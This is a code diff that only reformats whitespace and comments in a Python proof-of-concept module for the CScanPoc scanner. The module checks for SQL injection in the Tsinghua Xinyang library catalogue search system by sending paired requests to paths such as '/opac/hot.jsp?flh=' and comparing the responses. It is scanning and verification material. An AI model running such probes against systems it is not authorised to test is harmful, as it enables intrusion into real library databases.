@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Infosea_0002' # 平台漏洞编号，留空
+    vuln_id = 'Infosea_0002'  # 平台漏洞编号，留空
     name = '清大新洋图书检索系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-12-04'  # 漏洞公布时间
     desc = '''
         清大新洋图书系统 
@@ -24,6 +25,7 @@ class Vuln(ABVuln):
     product = '清大新洋'  # 漏洞应用名称
     product_version = '清大新洋图书检索系统'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = 'ca9bd0da-7072-407c-bbd4-8a1339e3d73e'
     author = '47bwy'  # POC编写者
@@ -36,11 +38,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-085319
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-082667
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-079840
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-014662
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-085319
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-082667
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-079840
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-014662
             hh = hackhttp.hackhttp()
             payloads = [
                 '/opac/hot.jsp?flh=',
@@ -54,11 +56,11 @@ class Poc(ABPoc):
                 url1 = self.target + payload + getdata1
                 url2 = self.target + payload + getdata2
                 code1, head, res1, errcode, _ = hh.http(url1)
-                code2, head, res2, errcode, _ = hh.http(url2)  
+                code2, head, res2, errcode, _ = hh.http(url2)
                 m1 = re.findall('href', res1)
                 m2 = re.findall('href', res2)
 
-                if code1 == 200 and code2 ==200 and m1!=m2:
+                if code1 == 200 and code2 == 200 and m1 != m2:
                     #security_hole(arg+payload+'   :found sql Injection')
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -68,6 +70,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
